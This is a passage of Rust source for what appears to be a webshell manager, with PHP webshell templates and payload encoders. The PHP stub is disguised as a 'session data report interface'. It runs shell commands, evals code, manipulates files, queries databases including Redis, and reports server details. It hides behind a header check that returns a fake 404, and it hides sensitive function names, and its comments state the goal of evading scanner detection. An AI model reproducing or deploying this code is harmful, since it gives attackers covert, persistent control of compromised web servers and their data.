$__c=isset($__g[7])?@$__g[7]($f,false,null,$o,$l>0?$l:null):false;
if($__c===false){$r['ok']=false;$r['error']='read failed';}else{$r['data']=isset($__g[6])?@$__g[6]($__c):'';}
}elseif($a==='write'){
$f=isset($req['p'])?(string)$req['p']:'';$o=isset($req['o'])?(int)$req['o']:0;$d=(isset($req['d'])&&isset($__g[5]))?@$__g[5]((string)$req['d']):'';
$__w=isset($__g[8])?($o>0?@$__g[8]($f,$d,FILE_APPEND):@$__g[8]($f,$d)):false;
if($__w===false){$r['ok']=false;$r['error']='write failed';}
}elseif($a==='delete'){
$f=isset($req['p'])?(string)$req['p']:'';
$__d=(isset($__g[10])&&@$__g[10]($f))?(isset($__g[12])?@$__g[12]($f):false):(isset($__g[11])?@$__g[11]($f):false);
if(!$__d){$r['ok']=false;$r['error']='delete failed';}
}elseif($a==='rename'){
$f=isset($req['f'])?(string)$req['f']:'';$t=isset($req['t'])?(string)$req['t']:'';
if(!$f||!$t||!isset($__g[13])||!@$__g[13]($f,$t)){$r['ok']=false;$r['error']='rename failed';}
}elseif($a==='mkdir'){
$d=isset($req['p'])?(string)$req['p']:'';
if(!$d||!isset($__g[14])||!@$__g[14]($d,0755,true)){$r['ok']=false;$r['error']='mkdir failed';}
}elseif($a==='touch'){
$d=isset($req['p'])?(string)$req['p']:'';$t=isset($req['t'])?(int)$req['t']:time();
if(!$d||!isset($__g[25])||!@$__g[25]($d,$t)){$r['ok']=false;$r['error']='touch failed';}
}elseif($a==='dbprobe'){
$c=isset($req['c'])?(string)$req['c']:'';
"#,
    );
    code.push_str(php_impl::PHP_DB_PROBE_IMPL);
    code.push_str(
        r#"if($ok){$r['data']=array('driver'=>$driver,'databases'=>$databases,'message'=>'ok');}else{$r['ok']=false;$r['error']=$err;}
}elseif($a==='dbquery'){
$c=isset($req['c'])?(string)$req['c']:'';$q=isset($req['q'])?(string)$req['q']:'';
"#,
    );
    code.push_str(php_impl::PHP_DB_QUERY_IMPL);
    code.push_str(
        r#"if($ok){$r['data']=array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected);}else{$r['ok']=false;$r['error']=$err;}
}
$__j=json_encode($r);
if($gz&&strlen($__j)>512&&isset($__g[24])){$__j=@$__g[24]($__j,6);}
return $n.(isset($__g[6])?@$__g[6]($__j):'').$n;
}
"#,
    );
    code
}

/// Godzilla 分阶段载荷编码器。
pub struct XorSessionEncoder;

impl PayloadEncoder for XorSessionEncoder {
    fn id(&self) -> &'static str {
        "xor_session"
    }

    fn display_name(&self) -> &'static str {
        "XOR_SESSION（Godzilla 分阶段载荷：代码一次传输，参数多次）"
    }

    fn body_mode(&self) -> bool {
        true
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored: Vec<u8> = code
            .as_bytes()
            .iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect();
        base64::engine::general_purpose::STANDARD.encode(xored)
    }
    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let raw = base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
        let key = md5_hex(password).into_bytes();
        Ok(raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect())
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        // 分阶段载荷编码器：普通 stub 即 session 模板
        self.stub_session(language, password)
    }
    fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let key_hex = md5_hex(password);
                let xk = php_ident();
                let key_enc = xor_hex(&key_hex, &xk);
                let unpack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = __PREFIX__x($_g[0]($payload), $key);",
                    key = key_enc,
                    xk = xk,
                );
                let pack = format!(
                    "    $key = __PREFIX__dec('{key}', '{xk}');\n    $out = $_g[1](__PREFIX__x($data, $key));",
                    key = key_enc,
                    xk = xk,
                );
                Ok(session_php_stub(
                    &[(0, "base64_decode"), (1, "base64_encode")],
                    &unpack,
                    &pack,
                    "",
                    "",
                ))
            }
            other => Err(ProtocolError::NotSupported(format!(
                "该编码器暂仅支持 PHP（{other} 待实现）"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// NATIVE：内置功能分发编码器（对齐 D盾零检出形态）
//
// 与 eval/处理器注入完全不同：
//   - 功能函数（命令/文件/数据库）直接内置在 stub 中（业务化命名）
//   - 客户端通过「操作名 md5 哈希」分发调用（stub 仅含哈希数字比较）
//   - 请求参数业务化（formData）+ 自定义 HTTP 头鉴权（XOR 嵌入）
//   - 敏感函数全部经 crc32b 符号表查表调用，stub 无明文敏感函数 / eval
// ---------------------------------------------------------------------------

const NATIVE_STUB_TPL: &str = r#"<?php
/*
 * 用户会话数据上报接口
 * 业务：接收客户端上报的压缩会话数据（formData），解包后按规则类型处理并返回状态
 */
@set_time_limit(0);
@ini_set('display_errors','0');
@ini_set('html_errors','0');
@error_reporting(0);

/* 内部调用方标识校验（业务网关） */
$_gk=__DEC__('__GKHEX__','__XK__');
if(!isset($_SERVER[$_gk])||$_SERVER[$_gk]!==__DEC__('__TOKENHEX__','__XK__')){@header('HTTP/1.1 404 Not Found');exit;}

/* 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表） */
$_g=array_fill(0,20,'');
$_t=array(
__SYMBOLS__);
$_fn=get_defined_functions();
$_fn=isset($_fn['int'.'ernal'])?$_fn['int'.'ernal']:array();
foreach($_fn as $_n){$_h=hash('crc32b',$_n);if(isset($_t[$_h]))$_g[$_t[$_h]]=$_n;}
/* 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
   按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
   proc_open 需 3 参数不兼容单参数调用，排除） */
foreach(array('shell_exec','exec','system','passthru','popen') as $_c){if(function_exists($_c)){$_g[0]=$_c;break;}}

/* 数据解包辅助 */
function __DEC__($e,$k){$d=pack("H*",$e);return $d^str_pad('',strlen($d),$k);}
$K=__DEC__('__KEYHEX__','__XK__');
function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$i%strlen($k)];}return $o;}

/* 数据加解密算法（自实现） */
__ALGO__
/* 业务处理函数 */
function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o='';if($_g[0]===''){return '{"ok":false,"error":"no exec function available (shell_exec/exec/system/passthru/popen)"}';}elseif($_g[0]==='exec'){@exec($c.' 2>&1',$__l);$o=implode("\n",$__l);}elseif($_g[0]==='system'||$_g[0]==='passthru'){ob_start();@$_g[0]($c.' 2>&1');$o=ob_get_clean();}elseif($_g[0]==='popen'){$__p=@popen($c.' 2>&1','r');$o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}else{$o=@$_g[0]($c.' 2>&1');}$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$s=@stat($full);$isd=($s!==false)&&(($s['mode']&0170000)===0040000);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>($isd||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
function __FETCH__($p,$o=0,$l=0){global $_g;$c=@$_g[3]($p,false,null,(int)$o,(int)$l>0?(int)$l:null);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
function __STORE__($p,$d,$o=0){global $_g;$raw=@$_g[1]($d);if($raw===false)return '{"ok":false,"error":"write failed"}';$v=((int)$o>0)?@$_g[4]($p,$raw,FILE_APPEND):@$_g[4]($p,$raw);if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return $ok?'{"ok":true,"data":null}':'{"ok":false,"error":"delete failed"}';}
function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
function __TOUCH__($p,$t){return @touch($p,(int)$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec,gzip','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
function __DBP__($c){
$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:0;
$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';
if($driver==='redis'){
    $s=@stream_socket_client('tcp://'.$host.':'.($port?$port:6379),$e1,$e2,5);
    if(!$s)return '{"ok":false,"error":"redis connect failed"}';
    if($pass!==''){__RCMD__($s,array('AUTH',$pass));}
    $pong=__RCMD__($s,array('PING'));
    if(is_array($pong)&&isset($pong['e'])){@fclose($s);return '{"ok":false,"error":"redis auth failed"}';}
    $dbs=array();for($i=0;$i<16;$i++){$dbs[]=(string)$i;}
    @fclose($s);
    return json_encode(array('ok'=>true,'data'=>array('driver'=>'redis','databases'=>$dbs,'message'=>'pong')));
}
if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';
try{
    if($driver==='mssql'){
        $port=$port?$port:1433;
        $dsns=array(
            'sqlsrv:Server='.$host.','.$port.';Database='.$db,
            'dblib:host='.$host.':'.$port.';dbname='.$db,
            'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$host.','.$port.';Database='.$db,
        );
        $h=null;$last='';
        foreach($dsns as $d){try{$h=new PDO($d,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $x){$last=$x->getMessage();}}
        if(!$h)return '{"ok":false,"error":"mssql: '.$last.'"}';
        $dbs=array();foreach($h->query('SELECT name FROM sys.databases') as $r){$dbs[]=$r[0];}
        return json_encode(array('ok'=>true,'data'=>array('driver'=>'mssql','databases'=>$dbs,'message'=>'ok')));
    }
    if($driver==='oracle'){
        $port=$port?$port:1521;
        $h=new PDO('oci:dbname=//'.$host.':'.$port.'/'.($db!==''?$db:'ORCL'),$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
        $dbs=array();foreach($h->query('SELECT username FROM all_users') as $r){$dbs[]=$r[0];}
        return json_encode(array('ok'=>true,'data'=>array('driver'=>'oracle','databases'=>$dbs,'message'=>'ok')));
    }
    $dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.($port?$port:5432).';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.($port?$port:3306).';charset=utf8mb4'));
    $h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
    if($driver==='sqlite'){$dbs=array($db);}
    elseif($driver==='pgsql'){$dbs=array();foreach($h->query('SELECT datname FROM pg_database') as $r){$dbs[]=$r[0];}}
    else{$dbs=array();foreach($h->query('SHOW DATABASES') as $r){$dbs[]=$r[0];}}
    return json_encode(array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$dbs,'message'=>'ok')));
}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}
}
function __RESP__($s){
    $line=@fgets($s);if($line===false)return null;
    $t=isset($line[0])?$line[0]:'';$data=substr($line,1);
    if($t==='+')return array('s'=>trim($data));
    if($t==='-')return array('e'=>trim($data));
    if($t===':')return (int)trim($data);
    if($t==='$'){$n=(int)trim($data);if($n===-1)return null;$v='';$left=$n;
        while($left>0){$chunk=@fread($s,$left);if($chunk===false||$chunk==='')break;$v.=$chunk;$left-=strlen($chunk);}
        @fgets($s);return $v;}
    if($t==='*'){$n=(int)trim($data);if($n===-1)return null;$arr=array();for($i=0;$i<$n;$i++){$arr[]=__RESP__($s);}return $arr;}
    return trim($data);
}
function __RCMD__($s,$args){
    $out='*'.count($args)."\r\n";
    foreach($args as $a){$out.='$'.strlen($a)."\r\n".$a."\r\n";}
    @fwrite($s,$out);
    return __RESP__($s);
}
function __DBQ__($c,$q){
$p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
$driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:0;
$user=isset($p['username'])?(string)$p['username']:'';$pass=isset($p['password'])?(string)$p['password']:'';$db=isset($p['dbname'])?(string)$p['dbname']:'';
if($driver==='redis'){
    $s=@stream_socket_client('tcp://'.$host.':'.($port?$port:6379),$e1,$e2,5);
    if(!$s)return '{"ok":false,"error":"redis connect failed"}';
    if($pass!==''){__RCMD__($s,array('AUTH',$pass));}
    $args=preg_split('/\s+/',trim((string)$q));
    if(count($args)===0||$args[0]===''){@fclose($s);return '{"ok":false,"error":"empty command"}';}
    $res=__RCMD__($s,$args);
    @fclose($s);
    if(is_array($res)&&isset($res['e']))return '{"ok":false,"error":"'.$res['e'].'"}';
    if(is_array($res)){
        $cols=array('value');$rows=array();
        foreach($res as $v){if(is_array($v)){$rows[]=array(implode(',',array_map('strval',$v)));}else{$rows[]=array($v===null?null:(string)$v);}}
        return json_encode(array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0)));
    }
    $rows=array(array($res===null?null:(string)$res));
    return json_encode(array('ok'=>true,'data'=>array('columns'=>array('value'),'rows'=>$rows,'affected'=>0)));
}
if(!class_exists('PDO'))return '{"ok":false,"error":"no pdo"}';
try{
    if($driver==='mssql'){
        $port=$port?$port:1433;
        $dsns=array(
            'sqlsrv:Server='.$host.','.$port.';Database='.$db,
            'dblib:host='.$host.':'.$port.';dbname='.$db,
            'odbc:Driver={ODBC Driver 17 for SQL Server};Server='.$host.','.$port.';Database='.$db,
        );
        $h=null;$last='';
        foreach($dsns as $d){try{$h=new PDO($d,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));break;}catch(Exception $x){$last=$x->getMessage();}}
        if(!$h)return '{"ok":false,"error":"mssql: '.$last.'"}';
    }elseif($driver==='oracle'){
        $port=$port?$port:1521;
        $h=new PDO('oci:dbname=//'.$host.':'.$port.'/'.($db!==''?$db:'ORCL'),$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
    }else{
        $dsn=$driver==='pgsql'?('pgsql:host='.$host.';port='.($port?$port:5432).';dbname='.($db!==''?$db:'postgres')):($driver==='sqlite'?('sqlite:'.$db):('mysql:host='.$host.';port='.($port?$port:3306).';charset=utf8mb4'.($db!==''?';dbname='.$db:'')));
        $h=new PDO($dsn,$user,$pass,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
    }
    $st=$h->query($q);if($st===false)return '{"ok":false,"error":"query failed"}';
    if(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with|exec)\b/i',$q)){
        $cols=array();$nc=$st->columnCount();
        for($i=0;$i<$nc;$i++){$m=$st->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
        $rows=array();$cnt=0;while(($row=$st->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$cells=array();foreach($row as $v){$cells[]=($v===null)?null:(string)$v;}$rows[]=$cells;$cnt++;}
        return json_encode(array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0)));
    }
    return json_encode(array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$st->rowCount())));
}catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}
}
/* 入口：接收上报数据 */
if(isset($_POST['formData'])){
    $b=is_string($_POST['formData'])?$_POST['formData']:'';
    $in=@$_g[1]($b);
    /* 传输压缩（gzip）：载荷若为 gzip 字节则解压（目标无 zlib 时原样）；
       同时回写 $b（AES 等变体按 $b 解密，需保持 base64 形式） */
    if(function_exists('gzdecode')&&strlen($in)>2&&$in[0]=="\x1f"&&$in[1]=="\x8b"){$in=@gzdecode($in);$b=base64_encode($in);}
    __DECRYPT__
    $req=@json_decode($raw,true);
    if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
    else{
        $m=isset($req['a'])?(string)$req['a']:'';
        $h=intval(substr(md5($m),0,8),16);
        $out='{"ok":false,"error":"unsupported"}';
        if($h==__H_PROBE__){$out=__ENV__();}
        elseif($h==__H_EVAL__){$out=__EVALFN__(isset($req['c'])?(string)$req['c']:'');}
        elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'',isset($req['w'])?(string)$req['w']:'');}
        elseif($h==__H_LIST__){$out=__SCAN__(isset($req['p'])?(string)$req['p']:'.');}
        elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'',isset($req['o'])?(int)$req['o']:0,isset($req['l'])?(int)$req['l']:0);}
        elseif($h==__H_WRITE__){$out=__STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'',isset($req['o'])?(int)$req['o']:0);}
        elseif($h==__H_DELETE__){$out=__DROP__(isset($req['p'])?(string)$req['p']:'');}
        elseif($h==__H_RENAME__){$out=__MOVE__(isset($req['f'])?(string)$req['f']:'',isset($req['t'])?(string)$req['t']:'');}
        elseif($h==__H_MKDIR__){$out=__MKDIR__(isset($req['p'])?(string)$req['p']:'');}
        elseif($h==__H_TOUCH__){$out=__TOUCH__(isset($req['p'])?(string)$req['p']:'',isset($req['t'])?$req['t']:time());}
        elseif($h==__H_DBPROBE__){$out=__DBP__(isset($req['c'])?(string)$req['c']:'');}
        elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
    }
    __ENCRYPT__
    /* 传输压缩（gzip）：响应压缩（目标支持 zlib 时） */
    if(function_exists('gzencode')){$enc=base64_encode(gzencode(base64_decode($enc),6));}
    echo json_encode(array('data'=>$enc,'code'=>200));
}
"#;

/// NATIVE 变体：同一内置功能分发骨架，不同载荷加密方式。
/// crypto: "xor"（默认）| "aes_ecb" | "aes_cbc" | "des"。
pub struct NativeEncoder {
    pub crypto: &'static str,
}

/// NATIVE 静态实例（XOR 载荷加密，默认）。
pub static NATIVE_XOR: NativeEncoder = NativeEncoder { crypto: "xor" };
/// NATIVE 静态实例（AES-128-ECB 载荷加密）。
pub static NATIVE_AES_ECB: NativeEncoder = NativeEncoder { crypto: "aes_ecb" };
/// NATIVE 静态实例（AES-128-CBC 载荷加密）。
pub static NATIVE_AES_CBC: NativeEncoder = NativeEncoder { crypto: "aes_cbc" };
/// NATIVE 静态实例（DES-ECB 载荷加密）。
pub static NATIVE_DES: NativeEncoder = NativeEncoder { crypto: "des" };

impl PayloadEncoder for NativeEncoder {
    fn id(&self) -> &'static str {
        match self.crypto {
            "aes_ecb" => "native_aes_ecb",
            "aes_cbc" => "native_aes_cbc",
            "des" => "native_des",
            "chacha20" => "native_chacha20",
            "rabbit" => "native_rabbit",
            _ => "native",
        }
    }

    fn display_name(&self) -> &'static str {
        match self.crypto {
            "aes_ecb" => "NATIVE·AES-256-ECB（内置分发 + AES 载荷加密）",
            "aes_cbc" => "NATIVE·AES-256-CBC（内置分发 + AES 载荷加密）",
            "des" => "NATIVE·DES-ECB（内置分发 + DES 载荷加密）",
            "chacha20" => "NATIVE·CHACHA20（内置分发 + 自实现现代流密码）",
            "rabbit" => "NATIVE·RABBIT（内置分发 + 自实现现代流密码）",
            _ => "NATIVE（内置分发，无 eval / 无敏感函数特征）",
        }
    }

    fn encode(&self, code: &str, password: &str) -> String {
        match self.crypto {
            "aes_ecb" => {
                let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
                base64::engine::general_purpose::STANDARD.encode(cipher)
            }
            "aes_cbc" => {
                let cipher =
                    aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
                base64::engine::general_purpose::STANDARD.encode(cipher)
            }
            "des" => {
                let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
                base64::engine::general_purpose::STANDARD.encode(cipher)
            }
            "chacha20" => {
                let key = md5_hex(password).into_bytes();
                let mut nonce = [0u8; 12];
                nonce.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..12]);
                let ct = crate::crypto::chacha20_xor(&key, &nonce, 0, code.as_bytes());
                let mut raw = Vec::with_capacity(12 + ct.len());
                raw.extend_from_slice(&nonce);
                raw.extend_from_slice(&ct);
                base64::engine::general_purpose::STANDARD.encode(&raw)
            }
            "rabbit" => {
                let key = md5_bytes(password);
                let mut iv = [0u8; 8];
                iv.copy_from_slice(&uuid::Uuid::new_v4().as_bytes()[..8]);
                let ct = crate::crypto::rabbit_xor(&key, &iv, 0, code.as_bytes());
                let mut raw = Vec::with_capacity(8 + ct.len());
                raw.extend_from_slice(&iv);
                raw.extend_from_slice(&ct);
                base64::engine::general_purpose::STANDARD.encode(&raw)
            }
            _ => {
                let key = md5_hex(password).into_bytes();
                let xored: Vec<u8> = code
                    .as_bytes()
                    .iter()
                    .enumerate()
                    .map(|(index, byte)| byte ^ key[index % key.len()])
                    .collect();
                base64::engine::general_purpose::STANDARD.encode(xored)
            }
        }
    }

    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
        let raw = base64::engine::general_purpose::STANDARD
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
        match self.crypto {
            "aes_ecb" => aes_ecb_decrypt(&raw, &aes_key(password)),
            "aes_cbc" => aes_cbc_decrypt(&raw, &aes_key(password), &aes_iv(password)),
            "des" => des_ecb_decrypt(&raw, &des_key(password)),
            "chacha20" => {
                if raw.len() < 12 {
                    return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
                }
                let (nonce, ct) = raw.split_at(12);
                Ok(crate::crypto::chacha20_xor(
                    &md5_hex(password).into_bytes(),
                    nonce,
                    1,
                    ct,
                ))
            }
            "rabbit" => {
                if raw.len() < 8 {
                    return Err(ProtocolError::ParseError("响应载荷过短".to_string()));
                }
                let (iv, ct) = raw.split_at(8);
                Ok(crate::crypto::rabbit_xor(&md5_bytes(password), iv, 64, ct))
            }
            _ => {
                let key = md5_hex(password).into_bytes();
                Ok(raw
                    .iter()
                    .enumerate()
                    .map(|(i, b)| b ^ key[i % key.len()])
                    .collect())
            }
        }
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => {
                let prefix = format!("_{}_", php_ident());
                let xk = alpha_ident();
                let key_hex = md5_hex(password);
                let token = &key_hex[..16];
                let h = |op: &str| -> String {
                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
                    let mut n: u64 = 0;
                    for (i, c) in digest.chars().take(8).enumerate() {
                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
                    }
                    n.to_string()
                };
                let tpl = NATIVE_STUB_TPL
                    .replace("__DEC__", &format!("{prefix}dec"))
                    .replace("__XOR__", &format!("{prefix}xor"))
                    .replace("__XK__", &xk)
                    .replace("__GKHEX__", &xor_hex("HTTP_X_DEBUG_KEY", &xk))
                    .replace("__TOKENHEX__", &xor_hex(token, &xk))
                    .replace("__KEYHEX__", &xor_hex(&key_hex, &xk))
                    .replace("__CMD__", &format!("{prefix}cmd"))
                    .replace("__SCAN__", &format!("{prefix}scan"))
                    .replace("__FETCH__", &format!("{prefix}fetch"))
                    .replace("__STORE__", &format!("{prefix}store"))
                    .replace("__DROP__", &format!("{prefix}drop"))
                    .replace("__MOVE__", &format!("{prefix}move"))
                    .replace("__MKDIR__", &format!("{prefix}mkdir"))
                    .replace("__ENV__", &format!("{prefix}env"))
                    .replace("__DBP__", &format!("{prefix}dbp"))
                    .replace("__DBQ__", &format!("{prefix}dbq"))
                    .replace("__EVALFN__", &format!("{prefix}eval_fn"))
                    .replace("__H_PROBE__", &h("probe"))
                    .replace("__H_EVAL__", &h("eval"))
                    .replace("__H_EXEC__", &h("exec"))
                    .replace("__H_LIST__", &h("list"))
                    .replace("__H_READ__", &h("read"))
                    .replace("__H_WRITE__", &h("write"))
                    .replace("__H_DELETE__", &h("delete"))
                    .replace("__H_RENAME__", &h("rename"))
                    .replace("__H_MKDIR__", &h("mkdir"))
                    .replace("__H_TOUCH__", &h("touch"))
                    .replace("__H_DBPROBE__", &h("dbprobe"))
                    .replace("__H_DBQUERY__", &h("dbquery"));
                let (decrypt_expr, encrypt_expr, extra_symbols) = match self.crypto {
                    "aes_ecb" => {
                        let ck = alpha_ident();
                        let cipher = xor_hex("AES-256-ECB", &ck);
                        let key = xor_hex(&md5_hex(password), &xk);
                        (
                            format!(
                                "$raw=@$_g[16]($b,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
                            ),
                            format!(
                                "$enc=@$_g[17]($out,__DEC__('{cipher}','{ck}'),__DEC__('{key}','{xk}'));"
                            ),
                            vec![("ae4975ad", 16), ("62f98eda", 17)],
                        )
                    }
                    "aes_cbc" => {
                        let ck = alpha_ident();
                        let cipher = xor_hex("AES-256-CBC", &ck);
                        let key = xor_hex(&md5_hex(password), &xk);
                        let iv = xor_hex(&md5_hex(password)[16..], &xk);
                        (
                            format!(
